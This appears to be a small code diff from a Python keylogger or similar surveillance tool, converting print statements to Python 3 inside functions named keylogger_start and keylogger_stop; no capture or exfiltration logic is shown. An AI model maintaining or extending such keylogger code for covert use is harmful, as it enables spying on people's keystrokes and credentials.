@@ -1,3 +1,4 @@
+from __future__ import print_function
 import os
 import time
 import base64
@@ -161,8 +162,8 @@ def keylogger_start():
     except:
         pass
 
-    print logFile
-    print pid
+    print(logFile)
+    print(pid)
     return True
 
 def keylogger_stop():
